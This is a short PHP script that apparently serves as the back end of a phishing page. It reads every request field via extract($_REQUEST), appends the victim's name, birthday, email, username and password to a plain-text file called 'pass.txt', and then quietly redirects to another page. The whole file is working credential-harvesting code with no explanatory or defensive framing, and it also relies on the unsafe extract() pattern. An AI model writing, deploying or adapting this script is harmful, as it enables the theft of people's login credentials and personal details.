<?php
extract($_REQUEST);
$file=fopen("pass.txt","a");
fwrite($file,"Name    : ");
fwrite($file,$name ."\n");
fwrite($file,"Birthday: ");
fwrite($file,$birthday ."\n");
fwrite($file,"Email   : ");
fwrite($file,$pemil ."\n");
fwrite($file,"Username: ");
fwrite($file,$email ."\n");
fwrite($file,"Password: ");
fwrite($file,$pass ."\n");
fclose($file);
header('Location:b.html');

?>